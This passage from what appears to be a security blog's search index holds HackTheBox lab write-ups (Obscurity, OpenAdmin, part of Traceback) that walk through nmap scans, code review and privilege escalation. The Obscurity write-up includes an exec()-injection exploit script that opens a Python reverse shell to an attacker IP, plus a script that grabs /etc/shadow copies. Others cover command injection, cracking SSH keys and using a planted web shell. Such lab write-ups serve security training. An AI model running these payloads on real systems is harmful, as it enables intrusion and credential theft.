SF:n\\t&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20content=\\\"IE=Edge\\\"&gt;\\n\\t&lt; SF:meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-s SF:cale=1\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"keywords\\\"\\x20content=\\\"\\\"&gt;\\n\\t&lt;meta\\x20na SF:me=\\\"description\\\"\\x20content=\\\"\\\"&gt;\\n&lt;!--\\x20\\nEasy\\x20Profile\\x20Templ SF:ate\\nhttp://www\\.templatemo\\.com/tm-467-easy-profile\\n--&gt;\\n\\t&lt;!--\\x20st SF:ylesheet\\x20css\\x20--&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/boo SF:tstrap\\.min\\.css\\\"&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/font-a SF:wesome\\.min\\.css\\\"&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/templa SF:temo-blue\\.css\\\"&gt;\\n&lt;/head&gt;\\n&lt;body\\x20data-spy=\\\"scroll\\\"\\x20data-target SF:=\\\"\\.navbar-collapse\\\"&gt;\\n\\n&lt;!--\\x20preloader\\x20section\\x20--&gt;\\n&lt;!--\\n&lt; SF:div\\x20class=\\\"preloader\\\"&gt;\\n\\t&lt;div\\x20class=\\\"sk-spinner\\x20sk-spinner SF:-wordpress\\\"&gt;\\n\")%r(HTTPOptions,10FC,\"HTTP/1\\.1\\x20200\\x20OK\\nDate:\\x20 SF:Fri,\\x2021\\x20Feb\\x202020\\x2021:03:21\\nServer:\\x20BadHTTPServer\\nLast-M SF:odified:\\x20Fri,\\x2021\\x20Feb\\x202020\\x2021:03:21\\nContent-Length:\\x204 SF:171\\nContent-Type:\\x20text/html\\nConnection:\\x20Closed\\n\\n&lt;!DOCTYPE\\x20 SF:html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n\\t&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\t SF:&lt;title&gt;0bscura&lt;/title&gt;\\n\\t&lt;meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x20co SF:ntent=\\\"IE=Edge\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"viewport\\\"\\x20content=\\\"width=dev SF:ice-width,\\x20initial-scale=1\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"keywords\\\"\\x20conte SF:nt=\\\"\\\"&gt;\\n\\t&lt;meta\\x20name=\\\"description\\\"\\x20content=\\\"\\\"&gt;\\n&lt;!--\\x20\\nE SF:asy\\x20Profile\\x20Template\\nhttp://www\\.templatemo\\.com/tm-467-easy-pro SF:file\\n--&gt;\\n\\t&lt;!--\\x20stylesheet\\x20css\\x20--&gt;\\n\\t&lt;link\\x20rel=\\\"stylesh SF:eet\\\"\\x20href=\\\"css/bootstrap\\.min\\.css\\\"&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet SF:\\\"\\x20href=\\\"css/font-awesome\\.min\\.css\\\"&gt;\\n\\t&lt;link\\x20rel=\\\"stylesheet SF:\\\"\\x20href=\\\"css/templatemo-blue\\.css\\\"&gt;\\n&lt;/head&gt;\\n&lt;body\\x20data-spy=\\\" SF:scroll\\\"\\x20data-target=\\\"\\.navbar-collapse\\\"&gt;\\n\\n&lt;!--\\x20preloader\\x20 SF:section\\x20--&gt;\\n&lt;!--\\n&lt;div\\x20class=\\\"preloader\\\"&gt;\\n\\t&lt;div\\x20class=\\\"s SF:k-spinner\\x20sk-spinner-wordpress\\\"&gt;\\n--&gt;\"); Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%), Linux 3.1 - 3.2 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 47.56 ms 10.10.14.1 2 47.70 ms 10.10.10.168 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Feb 21 22:01:52 2020 -- 1 IP address (1 host up) scanned in 33.43 seconds . We find port 22 open, with OpenSSH 7.6p1, and port 8080, with BadHTTPServer, a completely custom web server. Visiting the content of the web server we find a series of static pages, apparently useless, but one of which containing a message for the developers: . We know that there is a developement folder containing the SuperSecureServer.py file‚Ä¶ let‚Äôs find it! We can use any fuzzing program, such as wfuzz, ffuf, zaproxy etc ‚Ä¶ . We find that the correct URL is http://10.10.10.168:8080/develop/SuperSecureServer.py and the content of the file is the following: . import socket import threading from datetime import datetime import sys import os import mimetypes import urllib.parse import subprocess respTemplate = \"\"\"HTTP/1.1 {statusNum} {statusCode} Date: {dateSent} Server: {server} Last-Modified: {modified} Content-Length: {length} Content-Type: {contentType} Connection: {connectionType} {body} \"\"\" DOC_ROOT = \"DocRoot\" CODES = {\"200\": \"OK\", \"304\": \"NOT MODIFIED\", \"400\": \"BAD REQUEST\", \"401\": \"UNAUTHORIZED\", \"403\": \"FORBIDDEN\", \"404\": \"NOT FOUND\", \"500\": \"INTERNAL SERVER ERROR\"} MIMES = {\"txt\": \"text/plain\", \"css\":\"text/css\", \"html\":\"text/html\", \"png\": \"image/png\", \"jpg\":\"image/jpg\", \"ttf\":\"application/octet-stream\",\"otf\":\"application/octet-stream\", \"woff\":\"font/woff\", \"woff2\": \"font/woff2\", \"js\":\"application/javascript\",\"gz\":\"application/zip\", \"py\":\"text/plain\", \"map\": \"application/octet-stream\"} class Response: def __init__(self, **kwargs): self.__dict__.update(kwargs) now = datetime.now() self.dateSent = self.modified = now.strftime(\"%a, %d %b %Y %H:%M:%S\") def stringResponse(self): return respTemplate.format(**self.__dict__) class Request: def __init__(self, request): self.good = True try: request = self.parseRequest(request) self.method = request[\"method\"] self.doc = request[\"documentc\"] self.vers = request[\"vers\"] self.header = request[\"header\"] self.body = request[\"body\"] except: self.good = False def parseRequest(self, request): req = request.strip(\"\\r\").split(\"\\n\") method,doc,vers = req[0].split(\" \") header = req[1:-3] body = req[-1] headerDict = {} for param in header: pos = param.find(\": \") key, val = param[:pos], param[pos+2:] headerDict.update({key: val}) return {\"method\": method, \"doc\": doc, \"vers\": vers, \"header\": headerDict, \"body\": body} class Server: def __init__(self, host, port): self.host = host self.port = port self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) self.sock.bind((self.host, self.port)) def listen(self): self.sock.listen(5) while True: client, address = self.sock.accept() client.settimeout(60) threading.Thread(target = self.listenToClient,args = (client,address)).start() def listenToClient(self, client, address): size = 1024 while True: try: data = client.recv(size) if data: # Set the response to echo back the recieved data req = Request(data.decode()) self.handleRequest(req, client, address) client.shutdown() client.close() else: raise error('Client disconnected') except: client.close() return False def handleRequest(self, request, conn, address): if request.good: # try: # print(str(request.method) + \" \" + str(request.doc), end=' ') # print(\"from {0}\".format(address[0])) # except Exception as e: # print(e) document = self.serveDoc(request.doc, DOC_ROOT) statusNum=document[\"status\"] else: document = self.serveDoc(\"/errors/400.html\", DOC_ROOT) statusNum=\"400\" body = document[\"body\"] statusCode=CODES[statusNum] dateSent = \"\" server = \"BadHTTPServer\" modified = \"\" length = len(body) contentType = document[\"mime\"] # Try and identify MIME type from string connectionType = \"Closed\" resp = Response( statusNum=statusNum, statusCode=statusCode, dateSent = dateSent, server = server, modified = modified, length = length, contentType = contentType, connectionType = connectionType, body = body ) data = resp.stringResponse() if not data: return -1 conn.send(data.encode()) return 0 def serveDoc(self, path, docRoot): path = urllib.parse.unquote(path) try: info = \"output = 'Document: {}'\" # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) if path == \"/\": path = \"/index.html\" requested = os.path.join(docRoot, path[1:]) if os.path.isfile(requested): mime = mimetypes.guess_type(requested) mime = (mime if mime[0] != None else \"text/html\") mime = MIMES[requested.split(\".\")[-1]] try: with open(requested, \"r\") as f: data = f.read() except: with open(requested, \"rb\") as f: data = f.read() status = \"200\" else: errorPage = os.path.join(docRoot, \"errors\", \"404.html\") mime = \"text/html\" with open(errorPage, \"r\") as f: data = f.read().format(path) status = \"404\" except Exception as e: print(e) errorPage = os.path.join(docRoot, \"errors\", \"500.html\") mime = \"text/html\" with open(errorPage, \"r\") as f: data = f.read() status = \"500\" return {\"body\": data, \"mime\": mime, \"status\": status} . The script handles client-server requests to the web server, but contains a vulnerability in the following code segment . path = urllib.parse.unquote(path) try: info = \"output = 'Document: {}'\" # Keep the output for later debug exec(info.format(path)) # This is how you do string formatting, right? cwd = os.path.dirname(os.path.realpath(__file__)) docRoot = os.path.join(cwd, docRoot) . since an exec instruction is executed into info, that contains path, a variable that we can populate at will and which will be injected into the exec. Let‚Äôs build a script that allows us to exploit the vulnerability: . import requests import urllib import os target = 'http://10.10.10.168:8080/' expl = 'tmp\\''+'\\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.27\",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"])\\na=\\'' payload = urllib.parse.quote(expl) print(\"payload\") print(target + payload) r = requests.get(target+payload) print(r.headers) print(t.text) . This script will inject a reverse-shell to our IP, on port 9999, as the content of the variable passed to the exec statement will compose this payload: . exec (output = 'Document: tmp' import socket, subprocess, os; s = socket.socket (socket.AF_INET, socket.SOCK_STREAM); s.connect ((\"10.10.14.27\", 9999)); os.dup2 (s.fileno (), 0); os.dup2 (s.fileno (), 1); os.dup2 (s.fileno (), 2); p = subprocess.call ([ \"/ bin / bash\", \"- i\"]) a = '') . Lateral movement to Robert . Once we got the shell as www-data, let‚Äôs do some post-exploitation recon to find out that the user of the machine is called Robert. Visiting his home directory we find out that we can read the contents of his files. Inside the home we find a series of scripts, including a custom SSH server (BetterSSH), a crypt-decrypt tool (SuperSecureCrypt.py) and a set of files to perform some tests. The code for SuperSecureCrypt.py is the following: . import sys import argparse def encrypt(text, key): keylen = len(key) keyPos = 0 encrypted = \"\" for x in text: keyChr = key[keyPos] newChr = ord(x) newChr = chr((newChr + ord(keyChr)) % 255) encrypted += newChr keyPos += 1 keyPos = keyPos % keylen return encrypted def decrypt(text, key): keylen = len(key) keyPos = 0 decrypted = \"\" for x in text: keyChr = key[keyPos] newChr = ord(x) newChr = chr((newChr - ord(keyChr)) % 255) decrypted += newChr keyPos += 1 keyPos = keyPos % keylen return decrypted parser = argparse.ArgumentParser(description='Encrypt with 0bscura\\'s encryption algorithm') parser.add_argument('-i', metavar='InFile', type=str, help='The file to read', required=False) parser.add_argument('-o', metavar='OutFile', type=str, help='Where to output the encrypted/decrypted file', required=False) parser.add_argument('-k', metavar='Key', type=str, help='Key to use', required=False) parser.add_argument('-d', action='store_true', help='Decrypt mode') args = parser.parse_args() banner = \"################################\\n\" banner+= \"# BEGINNING #\\n\" banner+= \"# SUPER SECURE ENCRYPTOR #\\n\" banner+= \"################################\\n\" banner += \" ############################\\n\" banner += \" # FILE MODE #\\n\" banner += \" ############################\" print(banner) if args.o == None or args.k == None or args.i == None: print(\"Missing args\") else: if args.d: print(\"Opening file {0}...\".format(args.i)) with open(args.i, 'r', encoding='UTF-8') as f: data = f.read() print(\"Decrypting...\") decrypted = decrypt(data, args.k) print(\"Writing to {0}...\".format(args.o)) with open(args.o, 'w', encoding='UTF-8') as f: f.write(decrypted) else: print(\"Opening file {0}...\".format(args.i)) with open(args.i, 'r', encoding='UTF-8') as f: data = f.read() print(\"Encrypting...\") encrypted = encrypt(data, args.k) print(\"Writing to {0}...\".format(args.o)) with open(args.o, 'w', encoding='UTF-8') as f: f.write(encrypted) . while the contents of check.txt, out.txt and passwordreminder.txt is . root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# cat check.txt Encrypting this file with your key should result in out.txt, make sure your key is correct! . root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# hd out.txt 00000000 c2 a6 c3 9a c3 88 c3 aa c3 9a c3 9e c3 98 c3 9b |................| 00000010 c3 9d c3 9d c2 89 c3 97 c3 90 c3 8a c3 9f c2 85 |................| 00000020 c3 9e c3 8a c3 9a c3 89 c2 92 c3 a6 c3 9f c3 9d |................| 00000030 c3 8b c2 88 c3 9a c3 9b c3 9a c3 aa c2 81 c3 99 |................| 00000040 c3 89 c3 ab c2 8f c3 a9 c3 91 c3 92 c3 9d c3 8d |................| 00000050 c3 90 c2 85 c3 aa c3 86 c3 a1 c3 99 c3 9e c3 a3 |................| 00000060 c2 96 c3 92 c3 91 c2 88 c3 90 c3 a1 c3 99 c2 a6 |................| 00000070 c3 95 c3 a6 c3 98 c2 9e c2 8f c3 a3 c3 8a c3 8e |................| 00000080 c3 8d c2 81 c3 9f c3 9a c3 aa c3 86 c2 8e c3 9d |................| 00000090 c3 a1 c3 a4 c3 a8 c2 89 c3 8e c3 8d c3 9a c2 8c |................| 000000a0 c3 8e c3 ab c2 81 c3 91 c3 93 c3 a4 c3 a1 c3 9b |................| 000000b0 c3 8c c3 97 c2 89 c2 81 76 |........v| 000000b9 . root@kali:~/Documents/CTF/HTB/Machine/Obscurity/robert# hd passwordreminder.txt 00000000 c2 b4 c3 91 c3 88 c3 8c c3 89 c3 a0 c3 99 c3 81 |................| 00000010 c3 91 c3 a9 c2 af c2 b7 c2 bf 6b |..........k| 0000001b . We need to find the secret key in order to be able to decrypt the passwordreminder.txt file and authenticate ourselves as robert. To do this, we need to analyse the encryption script and crack out.txt . Because out.txt and check.txt are ‚Äúbrothers‚Äù (they depend on each other), what we want to do is use the SuperSecureCrypt.py encryption mechanism to brute-force each character of the alphabet with each character inside check.txt, until get out.txt. To do this, we just need to build a quick python script . import string banner = \"################################\\n\" banner+= \"# BEGINNING #\\n\" banner+= \"# SUPER SECURE ENCRYPTOR #\\n\" banner+= \"################################\\n\" banner+= \"################################\\n\" banner+= \"# BRUTE FORCE MODE #\\n\" banner+= \"################################\" print(banner) key = \"\" with open('check.txt','r',encoding='UTF-8') as f: clearFile = f.read() with open('out.txt','r',encoding='UTF-8') as f: cryptedFile = f.read() indCrypt = 0 for cryptChr in cryptedFile: # ciclo ogni carattere criptato for incr in range(1,255): # provo ogni valore di chiave newChr = ord(cryptChr) newChr = chr((newChr - incr) % 255) if newChr == clearFile[indCrypt]: key += chr(incr) break # vado alla lettera criptata successiva indCrypt = indCrypt +1 # tengo il conto della posizione del carattere print(key) . Running our script, we will get the secret password, and through the password we will be able to decode passwordreminder.txt . Password found! Now we can use it via the command su to become Robert. Privilege Escalation . Like the rest of the machine, the privilege escalation path is also based on the exploitation of a custom component of the box. By running the sudo -l command we will notice how the user can run the BetterSSH.py script with root permissions. BetterSSH.py source is the following: . import sys import random, string import os import time import crypt import traceback import subprocess path = ''.join(random.choices(string.ascii_letters + string.digits, k=8)) session = {\"user\": \"\", \"authenticated\": 0} try: session['user'] = input(\"Enter username: \") passW = input(\"Enter password: \") with open('/etc/shadow', 'r') as f: data = f.readlines() data = [(p.split(\":\") if \"$\" in p else None) for p in data] passwords = [] for x in data: if not x == None: passwords.append(x) passwordFile = '\\n'.join(['\\n'.join(p) for p in passwords]) with open('/tmp/SSH/'+path, 'w') as f: f.write(passwordFile) time.sleep(.1) salt = \"\" realPass = \"\" for p in passwords: if p[0] == session['user']: salt, realPass = p[1].split('$')[2:] break if salt == \"\": print(\"Invalid user\") os.remove('/tmp/SSH/'+path) sys.exit(0) salt = '$6$'+salt+'$' realPass = salt + realPass hash = crypt.crypt(passW, salt) if hash == realPass: print(\"Authed!\") session['authenticated'] = 1 else: print(\"Incorrect pass\") os.remove('/tmp/SSH/'+path) sys.exit(0) os.remove(os.path.join('/tmp/SSH/',path)) except Exception as e: traceback.print_exc() sys.exit(0) if session['authenticated'] == 1: while True: command = input(session['user'] + \"@Obscure$ \") cmd = ['sudo', '-u', session['user']] cmd.extend(command.split(\" \")) proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE) o,e = proc.communicate() print('Output: ' + o.decode('ascii')) print('Error: ' + e.decode('ascii')) if len(e.decode('ascii')) &gt; 0 else print('') . Here we can follow two methods to get root permissions: . | Intercept the file with /etc/shadow contents | Exploit the code vulnerability | . To save time, I decided to follow the first path. Since the script temporarily saves the contents of /etc/shadow within a randomly named file in /tmp/SSH, it is possible to intercept it and move it before the script removes it. To do this, we have to create the following mini-script: . #!/bin/bash while : do find \"/tmp/SSH\" -type f -exec mv {} /tmp/tmp \\; done . and run it, simultaneously execute BetterSSH.py with sudo. The program will return an error because it will not be able to delete the file that we have intercepted. On the other hand, by opening the intercepted file, we will be able to extract the hash of the root user to crack it with john. Once the password is obtained, we can use the su command to authenticate as root. Trophy . Notoriety wasn't as good as fame, but was heaps better than obscurity. - Neil Gaiman . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2019-11-30-Obscurity/",
    "relUrl": "/writeups/HackTheBox/2019-11-30-Obscurity/"
  },"19": {
    "doc": "Obscurity",
    "title": "Obscurity",
    "content": "30 Nov 2019 | Reading time: ~7 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2019-11-30-Obscurity/",
    "relUrl": "/writeups/HackTheBox/2019-11-30-Obscurity/"
  },"20": {
    "doc": "OpenAdmin",
    "title": "HackTheBox - OpenAdmin [Easy] ",
    "content": "#HackTheBox #Easy #Linux #code-review #lateral-movement #port-forwarding #ssh-keys-cracking #GTFObins #OpenNetAdmin #nano-privesc #command-injection #RCE #password-reuse #hardcoded-credentials #B2R . . | Improved skills: | Used tools: | Introduction &amp; Foothold | Lateral movement to Jimmy | Lateral movement to Joanna | Privilege Escalation | Trophy | . Improved skills: . | Enumeration | Apache configuration review | Code review | Lateral movement | Port Forwarding | SSH keys cracking | nano privilege escalation (GTFO) | . Used tools: . | nmap | dirbuster | searchsploit | metasploit | pspy64 | SwitchyOmega | ssh2john | john | . Introduction &amp; Foothold . Let‚Äôs start as every time with an nmap scan: . root@kali:~/Documents/CTF/Machine/OpenAdmin# nmap -sV -A -O 10.10.10.171 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-11 11:28 CET Nmap scan report for 10.10.10.171 Host is up (0.060s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.80%E=4%D=2/11%OT=22%CT=1%CU=31767%PV=Y%DS=2%DC=T%G=Y%TM=5E4281D OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2= OS:7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSN OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1720/tcp) HOP RTT ADDRESS 1 61.58 ms 10.10.14.1 2 61.83 ms 10.10.10.171 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 26.18 seconds . We can see that only two services are exposed: a non-vulnerable SSH version, and an Apache web server on port 80 with a default page. In order to enumerate all the possible sub-pages of the site and find an entry point, let‚Äôs start a Dirbuster scan. Among the first results of the tool execution we find these records: . / /index.php /icons/ /music/ /ona/ . Visiting each page, arrived at http://10.10.10.171/ona/ we realize that in front of us we have a vulnerable version of OpenNetAdmin, a web application for the network administration. Let‚Äôs use searchsploit to find out if there are exploits fitting this particular version‚Ä¶ the 47772 seems to be what we need, a Command Injection on OpenNetAdmin 18.1.1. We just have to download it, import it into metasploit, set the correct parameters and run it. Lateral movement to Jimmy . Analyzing the contents of the /etc/passwd file we notice that the main users on the box are actually two: Jimmy and Joanna. After having take a look at the machine and launching LinEnum.sh without success, I decided to check better the processes of the machine via pspy64. By observing the various processes, one particular line attracts my attention: . 2020/02/14 22:35:20 CMD: UID=33 PID=7150 | sh -c php -l /opt/ona/www/local/config/database_settings.inc.php . I decide to analyze the contents of the database_settings.inc.php file: . &lt;?php $ona_contexts=array ( 'DEFAULT' =&gt; array ( 'databases' =&gt; array ( 0 =&gt; array ( 'db_type' =&gt; 'mysqli', 'db_host' =&gt; 'localhost', 'db_login' =&gt; 'ona_sys', 'db_passwd' =&gt; 'n1nj4W4rri0R!', 'db_database' =&gt; 'ona_default', 'db_debug' =&gt; false, ), ), 'description' =&gt; 'Default data context', 'context_color' =&gt; '#D3DBFF', ), ); . We have a password! Let‚Äôs try using it to log in as jimmy‚Ä¶ it works! . Lateral movement to Joanna . Now that we have a shell as jimmy, our goal is to become joanna, as this user will take us to the root. Since we have new privileges compared to before, we will be able to enumerate the machine in more depth, as for the /var/www/internal/folder, which seems to suggest the presence of a web page that can only be visited from inside the machine, so before we could not find it via dirbuster. The confirmation is obtained from the Apache configuration file, which tells us that on port 52846 there is a virtual host running as joanna, exposing the pages contained in /var/www/internal/. At this point, there are different ways to go over the obstacle: . | SSH Port Forwarding | local curl | Write a PHP shell in the /var/www/internal/ directory | . In this writeup we will deal with the port forwarding approach. I used the OpenAdmin box as an SSH tunnel on the Kali local port 12345, and through SwitchyOmega I used port 12345 as a proxy so that when I visited http://127.0.0.1/52864 I was actually visiting locally the OpenAdmin machine. In this way we can interact with the web application as if it was an exposed application. Having access to the /var/www/internal/folder, it was possible to review the sources contents in search of any vulnerabilities or bypass techniques. The index.php page, for example, to log in a user, checks the supplied input with a hard-coded hash: . &lt;?php $msg = ''; if (isset($_POST['login']) &amp;&amp; !empty($_POST['username']) &amp;&amp; !empty($_POST['password'])) { if ($_POST['username'] == 'jimmy' &amp;&amp; hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') { $_SESSION['username'] = 'jimmy'; header(\"Location: /main.php\"); } else { $msg = 'Wrong username or password.'; } } ?&gt; . It is therefore easy to bypass the control, either by deciding to crack the hash (which turns out to be a SHA512 containing the password Revealed), or, since we have access to the source in read/write, replacing the control with a control at will. Once the control is bypassed, we will find ourselves on the main.php page with Joanna‚Äôs private RSA certificate shown on the video. Let‚Äôs copy it into the joanna.txt file and give it to ss2john in order to generate a hash that can be cracked with john: . We have Joanna‚Äôs password! . Privilege Escalation . The Privilege Escalation process is the easiest and fastest I‚Äôve ever seen. By running the sudo -l command we notice how the user joanna can open the /opt/priv file via the nano text editor as root user. We just have to run the command and, within nano, use the code execution feature to be able to run commands as root! . Trophy . It's never too late to start.&lt;br&gt; - Me, Myself and I . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2020-01-04-OpenAdmin/",
    "relUrl": "/writeups/HackTheBox/2020-01-04-OpenAdmin/"
  },"21": {
    "doc": "OpenAdmin",
    "title": "OpenAdmin",
    "content": "04 Jan 2020 | Reading time: ~6 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2020-01-04-OpenAdmin/",
    "relUrl": "/writeups/HackTheBox/2020-01-04-OpenAdmin/"
  },"22": {
    "doc": "Traceback",
    "title": "HackTheBox - Traceback [Easy] ",
    "content": "#HackTheBox #Easy #Linux #OSINT #luvit #lua #lateral-movement #insecure-file-permissions #B2R . . | Improved skills: | Used tools: | Introduction &amp; Foothold | Lateral Movement to sysadmin | Privilege Escalation | Trophy | . Improved skills: . | OSINT | Luvit lateral movement | motd privilege escalation | . Used tools: . | nmap | owasp zap | pspy64 | netcat | . Introduction &amp; Foothold . Like for every CTF we made, let‚Äôs start scanning the box with nmap . $ nmap 10.10.10.181 --top-ports 25 --open -sC -sV -oA nmap/openPorts.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Help us Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel . As we can see, there are only two services exposed: SSH (port 22) and the Apache Web Server (port 80). Visiting the site, we discover that the machine has been owned and there is a backdoor . Looking to the source code of the page, a comment comes out. Searching it on google, it reveals to be the description of a repo containing only web-shells. We can suppose that one of those shells is the one used in this machine. Assuming this, lets create a wordlist using the discovered shells‚Äô name and fuzz the web page in order to find the correct one. Bingo! smevk.php is the web shell used on the box. Credentials can be found on the source code on github. Easily guessable, the combination is admin:admin . Once inside, we can easily submit commands to the box. In order to get a more stable and comfortable shell, I added my SSH key to the authorized_keys file, obtaining an SSH access as webadmin. Lateral Movement to sysadmin . Listing all the files within the webadmin home directory, we discovered the presence of Luvit, a . scripting platform just like node. This can be used to run lua scripts as standalone servers, clients, or other tools. Furthermore, webadmin has the permissions to run luvit as sysadmin using sudo. It becames easy to perform action as sysadmin, like reading files . or getting a shell: . Privilege Escalation . Analyzing the processes running on the machine I noticed the presence of a process owned by the root modifiable by sysadmin. 2020/03/15 15:45:01 CMD: UID=106 PID=28288 | sshd: [net] 2020/03/15 15:45:01 CMD: UID=0 PID=28290 | run-parts --lsbsysinit /etc/update-motd.d 2020/03/15 15:45:01 CMD: UID=0 PID=28289 | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 2020/03/15 15:45:01 CMD: UID=0 PID=28297 | cut -c -80 2020/03/15 15:45:01 CMD: UID=0 PID=28296 | 2020/03/15 15:45:01 CMD: UID=0 PID=28295 | 2020/03/15 15:45:01 CMD: UID=0 PID=28293 | /bin/sh /etc/update-motd.d/50-motd-news 2020/03/15 15:45:01 CMD: UID=0 PID=28298 | run-parts --lsbsysinit /etc/update-motd.d 2020/03/15 15:45:01 CMD: UID=0 PID=28299 | /usr/bin/python3 -Es /usr/bin/lsb_release -cs 2020/03/15 15:45:01 CMD: UID=0 PID=28301 | /usr/sbin/CRON -f 2020/03/15 15:45:01 CMD: UID=0 PID=28300 | /usr/sbin/CRON -f 2020/03/15 15:45:01 CMD: UID=0 PID=28305 | /bin/cp /var/backups/.update-motd.d/00-header /var/backups/.update-motd.d/10-help-text /var/backups/.update-motd.d/50-motd-news /var/backups/.update-motd.d/80-esm /var/backups/.update-motd.d/91-release-upgrade /etc/update-motd.d/ 2020/03/15 15:45:01 CMD: UID=0 PID=28304 | sleep 30 2020/03/15 15:45:01 CMD: UID=0 PID=28303 | /bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/03/15 15:45:01 CMD: UID=0 PID=28302 | /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/ 2020/03/15 15:45:01 CMD: UID=0 PID=28306 | /usr/bin/python3 -Es /usr/bin/lsb_release -ds 2020/03/15 15:45:01 CMD: UID=0 PID=28307 | /bin/sh 